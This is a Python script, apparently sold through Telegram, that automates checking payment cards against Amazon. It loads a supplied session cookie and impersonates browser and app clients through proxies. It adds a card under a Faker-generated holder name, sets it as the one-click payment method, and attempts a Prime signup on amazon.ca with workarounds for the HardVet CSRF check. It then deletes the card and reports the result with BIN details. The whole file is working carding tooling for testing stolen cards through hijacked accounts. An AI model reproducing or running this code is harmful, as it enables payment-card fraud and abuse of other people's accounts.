#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
#  AMAZON PRIME BILLING FLOW | COOKIE CONTEXT (PYTHON)
#  Faithful port of backend/amazon_gateway/api.php
#  Billing on amazon.com (US) + Prime subscription on amazon.ca (CA),
#  HardVet CSRF retry, address confirm handling, BIN lookup.
# ══════════════════════════════════════════════════════════════════════════

import random, json, time
from .Utils import Core, MetaData
from faker import Faker
from urllib.parse import urlencode, quote_plus
from curl_cffi import requests as curl


class CookieContext:

    _ASSOC_MAP = {
        'ES': 'esflex', 'IT': 'itflex', 'US': 'usflex', 'DE': 'deflex',
        'FR': 'frflex', 'UK': 'ukflex', 'MX': 'mxflex', 'CA': 'caflex',
        'AU': 'auflex', 'BR': 'brflex', 'JP': 'jpflex', 'IN': 'inflex',
        'NL': 'nlflex', 'PL': 'plflex', 'SG': 'sgflex', 'AE': 'aeflex',
        'SA': 'saflex', 'TR': 'trflex',
    }

    def __init__(self, card: dict, cookie: str, proxy: str = None) -> None:
        self.cookieNonBuild = cookie
        self.cardNonParsed  = card
        self.fakeData       = Faker('en_US')
        self.proxies        = "http://" + proxy if proxy else None
        self.original_country = None
        self.tested_country  = None

    def _new_session(self, domain: str, ua: str, accept_lang: str, proxies: str = None):
        s = curl.Session(impersonate=random.choice(
            ["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
        if proxies:
            s.proxies = {"http": proxies, "https": proxies}
        s.cookies = None
        s.allow_redirects = True
        s.headers.update({"User-Agent": ua,
                          "Connection": "keep-alive",
                          "Accept-Language": accept_lang})
        return s

    def _load_cookies(self, session, cookie: str, domain: str):
        """Put cookie pairs into a given HTTP session (curl_cffi)."""
        import http.cookiejar
        jar = http.cookiejar.CookieJar()
        for pair in cookie.split(';'):
            if '=' not in pair:
                continue
            name, value = map(str.strip, pair.split('=', 1))
            c = http.cookiejar.Cookie(
                version=0, name=name, value=value, port=None, port_specified=False,
                domain=domain, domain_specified=True, domain_initial_dot=False,
                path='/', path_specified=True, secure=False, expires=None,
                discard=True, comment=None, comment_url=None, rest={}, rfc2109=False)
            jar.set_cookie(c)
        session.cookies = jar
        return session

    def buildFlowBilling(self) -> dict:

        # ── BIN info (best-effort) ──
        card_info = ''
        card_data = Core.parseCardString(self.cardNonParsed)
        if card_data.get('status'):
            bin_info = Core.getBinInfo(card_data['number'])
            if bin_info:
                parts = [bin_info.get('brand') or '', bin_info.get('bank') or '',
                         bin_info.get('type') or '', bin_info.get('level') or '']
                card_info = (' '.join(filter(None, parts))
                             + ' (' + (bin_info.get('country_name') or 'Desconocido') + ')').strip()

        # ── Detect original country from cookie ──
        region = Core.extractRegionCode(self.cookieNonBuild)
        detected_country = "US"
        if region:
            for k, v in Core.COUNTRY_MAP.items():
                if v["code"] == region:
                    detected_country = k
                    break
        self.original_country = detected_country
        self.tested_country   = "CA"

        # Card is added on amazon.com (US)
        base_country = "US"
        self.cookieNonBuild = Core.buildCookieAudible(self.cookieNonBuild, base_country)
        cookie_data = Core.buildCookieData(self.cookieNonBuild)

        if not card_data.get('status') or not cookie_data.get('status'):
            msg = card_data.get('message') if not card_data.get('status') else cookie_data.get('message')
            return {'status': False, 'message': msg}

        self.cardData    = card_data
        self.cookie      = cookie_data['cookie']
        self.domain      = cookie_data['domain']
        self.countryCode = cookie_data['country_code']
        assoc_handle     = self._ASSOC_MAP.get(self.countryCode, 'usflex')

        accept_lang = ('ja-JP,ja;q=0.9,en;q=0.8' if self.countryCode == 'JP'
                       else ('en-US,en;q=0.9,ar;q=0.8' if self.countryCode in ('AE', 'SA')
                             else 'en-US,en;q=0.9'))

        self.curl = self._new_session(self.domain,
                                      'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                                      accept_lang, self.proxies)
        self.curl = self._load_cookies(self.curl, self.cookie, self.domain)

        # ── Request 1: Amazon account manage page ──
        try:
            headers1 = {'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'X-Requested-With': 'com.amazon.mShop.android.shopping',
                        'Accept-Language': accept_lang}
            request1 = self.curl.get(
                f"https://www.{self.domain}/ax/account/manage"
                f"?openid.return_to=https%3A%2F%2Fwww.{self.domain}%2Fyour-account"
                f"&openid.assoc_handle={assoc_handle}"
                f"&shouldShowPasskeyLink=true"
                f"&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302"
                f"&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093",
                headers=headers1).text
        except Exception:
            return {'status': False, 'message': 'Invalid Cookie ⚠️: No relation with Amazon server, try again later!'}

        if "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later." in request1:
            return {'status': False, 'message': 'Invalid Cookie: Unable to access account page, refresh ur cookie!'}

        # ── Request 2: Payment settings (CSRF) ──
        headers2 = {'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'X-Requested-With': 'com.amazon.dee.app'}
        response2 = self.curl.get(
            f"https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca",
            headers=headers2).text
        csrf_token = Core.extractBetween(response2, 'csrfToken = "', '"')

        if not csrf_token:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie - Missing CSRF Token.',
                    'debug_html': response2[:10000]}

        # ── Request 3: Add card ──
        headers3 = {'Accept': 'application/json, text/plain, */*',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
                    'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': f'https://www.{self.domain}',
                    'X-Requested-With': 'com.amazon.dee.app',
                    'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        holder = f'{self.fakeData.first_name()} {self.fakeData.last_name()}'
        payload3 = (f'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B'
                    f'%22cc_CardHolderName%22%3A%22{holder}%22'
                    f'%2C%22cc_ExpirationMonth%22%3A%22{int(self.cardData["month"])}%22'
                    f'%2C%22cc_ExpirationYear%22%3A%22{self.cardData["year"]}%22%7D%7D%7D'
                    f'&csrfToken={quote_plus(csrf_token)}'
                    f'&addCreditCardNumber={self.cardData["number"]}')
        response3 = self.curl.post(f"https://www.{self.domain}/hz/mycd/ajax",
                                   headers=headers3, data=payload3).text
        payment_id = Core.extractBetween(response3, '"paymentInstrumentId":"', '"')

        if not payment_id:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie - Card addition failed.'}

        # ── Address (US) with retry loop ──
        address_id = MetaData.getBillingAddressId(self.curl, csrf_token, self.domain)
        addr_attempts = 0
        while not address_id and addr_attempts < 2:
            addr_attempts += 1
            add_address = MetaData.addBillingAddress(self.curl, self.domain, 'US')
            time.sleep(2)
            address_id = MetaData.getBillingAddressId(self.curl, csrf_token, self.domain)
            if not address_id and add_address.get('status') is False and addr_attempts >= 2:
                return {'status': False,
                        'message': 'Try again! - Failed to add billing address: ' + add_address.get('message', '')}
        if not address_id:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie - Address ID not retrieved.'}

        # ── Request 5: Set one-click payment ──
        headers5 = {'Accept': 'application/json, text/plain, */*',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
                    'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': f'https://www.{self.domain}',
                    'X-Requested-With': 'com.amazon.dee.app',
                    'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        payload5 = (f'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B'
                    f'%22paymentInstrumentId%22%3A%22{payment_id}%22'
                    f'%2C%22billingAddressId%22%3A%22{address_id}%22'
                    f'%2C%22isBankAccount%22%3Afalse%7D%7D%7D'
                    f'&csrfToken={quote_plus(csrf_token)}')
        response5 = self.curl.post(f"https://www.{self.domain}/hz/mycd/ajax",
                                   headers=headers5, data=payload5).text
        if '"success":true,"paymentInstrumentId":"' not in response5:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie. - Payment Instrument not set.'}

        # ── Request 6: Wallet page ──
        headers6 = {'Host': f'www.{self.domain}', 'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'X-Requested-With': 'com.amazon.mShop.android.shopping'}
        response6 = self.curl.get(
            f"https://www.{self.domain}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo",
            headers=headers6).text
        wigstst    = Core.extractBetween(
            response6, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"')
        customer_id = Core.extractBetween(response6, 'customerId":"', '"')
        wallet_session_id = Core.extractBetween(response6, '"sessionId":"', '"')
        widget_instance_id = Core.extractBetween(response6, 'widgetInstanceId":"', '"')

        if not wigstst:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'}

        # ── Request 7: Payment method ──
        headers7 = {'Host': f'www.{self.domain}',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest', 'Widget-Ajax-Attempt-Count': '0',
                    'APX-Widget-Info': f'YA:Wallet/mobile/{widget_instance_id}',
                    'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': f'https://www.{self.domain}',
                    'Referer': f'https://www.{self.domain}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo'}
        payload7 = (f'ppw-jsEnabled=true&ppw-widgetState={wigstst}'
                    f'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent'
                    f'&ppw-instrumentId={payment_id}')
        response7 = self.curl.post(
            f"https://www.{self.domain}/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget",
            headers=headers7, data=payload7).text
        payment_method = Core.extractBetween(response7, '\\"paymentMethodId\\":\\"', '\\"')

        if not payment_method:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie - Payment Method not found.',
                    'debug_html': response7[:10000]}

        # ═══════════════════════════════════════════════════════════════
        #  PRIME FLOW ON amazon.ca (CA) with a separate cookie/session
        # ═══════════════════════════════════════════════════════════════
        prime_cookie = Core.buildCookieAudible(self.cookieNonBuild, 'CA')
        prime_data   = Core.buildCookieData(prime_cookie)
        if not prime_data.get('status'):
            return {'status': False, 'message': prime_data.get('message') or 'Failed to build CA cookie.'}

        prime_domain = prime_data['domain']
        prime_curl = self._new_session(prime_domain,
                                       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                                       'en-US,en;q=0.9', self.proxies)
        prime_curl = self._load_cookies(prime_curl, prime_data['cookie'], prime_domain)

        # ── Request 8: Prime membersignup ──
        headers8 = {'Host': f'www.{prime_domain}',
                    'Content-Type': 'application/x-www-form-urlencoded'}
        payload8 = ('clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault'
                    '&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default'
                    '&planOptimizationId=default&inline=1&disableCSM=1')
        response8 = prime_curl.post(
            f"https://www.{prime_domain}/gp/prime/pipeline/membersignup",
            headers=headers8, data=payload8).text

        auth_token2 = Core.extractBetween(response8, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;', '&')
        prime_session_id = Core.extractBetween(response8, 'Subs:Prime&quot;,&quot;session&quot;:&quot;', '&')
        customer_id_prime = Core.extractBetween(response8, 'customerId&quot;:&quot;', '&')

        hardvet_csrf = None
        m = re_search(r'name=["\']wlp-hardvet-csrf-token["\']\s+content=["\']([^"\']+)["\']', response8)
        if not m:
            m = re_search(r'content=["\']([^"\']+)["\']\s+name=["\']wlp-hardvet-csrf-token["\']', response8)
        if m:
            hardvet_csrf = m

        if not auth_token2:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie - Prime Page not accessed.'}

        # ── Requests 9-11: widget continue / wallet ──
        headers9 = {'Host': f'www.{prime_domain}',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Apx-Widget-Info': 'Subs:Prime/desktop/LFqEJMZmYdCd',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': f'https://www.{prime_domain}',
                    'Referer': f'https://www.{prime_domain}/gp/prime/pipeline/confirm'}
        payload9 = (f'ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A'
                    f'%7B%22instrumentId%22%3A%5B%22{payment_id}%22%5D'
                    f'%2C%22instrumentIds%22%3A%5B%22{payment_id}%22%5D%7D=change'
                    f'&ppw-jsEnabled=true&ppw-widgetState={auth_token2}&ie=UTF-8')
        response9 = prime_curl.post(
            f'https://www.{prime_domain}/payments-portal/data/widgets2/v1/customer/{customer_id_prime}/continueWidget',
            headers=headers9, data=payload9).text
        auth_token3 = Core.extractBetween(response9, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')
        auth_token4 = Core.extractBetween(response9, 'data-instrument-id=\\"', '\\"')

        if not auth_token3:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie. - Card Page not accessed.'}

        headers10 = {'Host': f'www.{prime_domain}',
                     'X-Requested-With': 'XMLHttpRequest',
                     'Apx-Widget-Info': 'Subs:Prime/desktop/r9R8zQ8Dgh1b',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin': f'https://www.{prime_domain}',
                     'Referer': f'https://www.{prime_domain}/gp/prime/pipeline/membersignup'}
        payload10 = (f'ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent='
                     f'&ppw-jsEnabled=true&ppw-widgetState={auth_token3}&ie=UTF-8'
                     f'&ppw-{auth_token4}_instrumentOrderTotalBalance=%7B%7D'
                     f'&ppw-instrumentRowSelection=instrumentId%3D{payment_id}%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse'
                     f'&ppw-{payment_id}_instrumentOrderTotalBalance=%7B%7D')
        response10 = prime_curl.post(
            f'https://www.{prime_domain}/payments-portal/data/widgets2/v1/customer/{customer_id_prime}/continueWidget',
            headers=headers10, data=payload10).text
        wallet_id = Core.extractBetween(response10, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')

        if not wallet_id:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'}

        headers11 = {'Host': f'www.{prime_domain}',
                     'User-Agent': (f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(10, 99)}_1_2 like Mac OS X) '
                                    f'AppleWebKit/{random.randint(100, 999)}.1.15 (KHTML, like Gecko) Version/17.1.2 '
                                    f'Mobile/15E{random.randint(100, 999)} Safari/{random.randint(100, 999)}.1'),
                     'Content-Type': 'application/x-www-form-urlencoded'}
        payload11 = f'ppw-jsEnabled=true&ppw-widgetState={wallet_id}&ppw-widgetEvent=SavePaymentPreferenceEvent'
        response11 = prime_curl.post(
            f'https://www.{prime_domain}/payments-portal/data/widgets2/v1/customer/{customer_id_prime}/continueWidget',
            headers=headers11, data=payload11).text
        wallet_id = Core.extractBetween(response11, 'preferencePaymentMethodIds":"[\\"', '\\"')

        if not wallet_id:
            return {'status': False,
                    'message': 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'}

        # ── Finalize prime (HardVet) ──
        headers12 = {'Host': f'www.{prime_domain}',
                     'Upgrade-Insecure-Requests': '1',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'}
        action_url = f'https://www.{prime_domain}/hp/wlp/pipeline/actions'
        action_params = (f'redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME'
                         f'&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm'
                         f'&locationID=prime_confirm&primeCampaignId=SlashPrime'
                         f'&paymentMethodId={wallet_id}'
                         f'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet'
                         f'&cancelRedirectURL=Lw&paymentMethodIdList={wallet_id}'
                         f'&location=prime_confirm&session-id={prime_session_id}')

        response12 = ''
        final_url = ''

        def _final_url(resp, fb):
            return Core.final_url_from(resp, fb)

        if hardvet_csrf:
            headers12['Content-Type'] = 'application/x-www-form-urlencoded'
            payload12 = action_params + '&hardVetCsrfToken=' + quote_plus(hardvet_csrf)
            r12 = prime_curl.post(action_url, headers=headers12, data=payload12, allow_redirects=True)
            response12 = r12.text
            final_url = _final_url(r12, action_url)

        is_csrf = 'HardVetCsrfValidationFailed' in (response12 + ' ' + final_url)

        if not hardvet_csrf or is_csrf:
            attempts = [
                {'session': prime_session_id, 'follow': True},
                {'session': wallet_session_id, 'follow': True},
                {'session': prime_session_id, 'follow': False},
            ]
            for idx, attempt in enumerate(attempts):
                params = re_sub(r'&session-id=.*$', '&session-id=' + attempt['session'], action_params)
                target_url = action_url + '?' + params
                if attempt['follow']:
                    r12 = prime_curl.get(target_url, headers=headers12, allow_redirects=True)
                    response12 = r12.text
                    final_url = _final_url(r12, target_url)
                    status12 = getattr(r12, 'status_code', 200)
                    location = ''
                else:
                    r12 = prime_curl.get(target_url, headers=headers12, allow_redirects=False)
                    status12 = getattr(r12, 'status_code', 0)
                    location = ''
                    if 'Location' in r12.headers:
                        location = r12.headers['Location']
                    if 300 <= status12 < 400 and location and 'HardVetCsrfValidationFailed' not in location:
                        r12 = prime_curl.get(location, headers=headers12, allow_redirects=True)
                        response12 = r12.text
                        final_url = _final_url(r12, location)
                    else:
                        response12 = r12.text
                        final_url = location if location else target_url

                is_csrf = 'HardVetCsrfValidationFailed' in (response12 + ' ' + final_url)
                if not is_csrf:
                    break
                if idx < len(attempts) - 1:
                    time.sleep(1)

        # ── Cleanup: delete payment method ──
        delete_process = MetaData.deletePaymentMethod(self.cookieNonBuild, payment_method, self.proxies)

        result = Core.buildFlowBillingResult(
            response12, delete_process, self.countryCode, self.cardData, final_url)
        if isinstance(result, dict):
            result['card_info'] = card_info
        return result


def re_search(pattern, text):
    import re
    m = re.search(pattern, text, re.I)
    return m.group(1) if m else None


def re_sub(pattern, repl, text):
    import re
    return re.sub(pattern, repl, text)
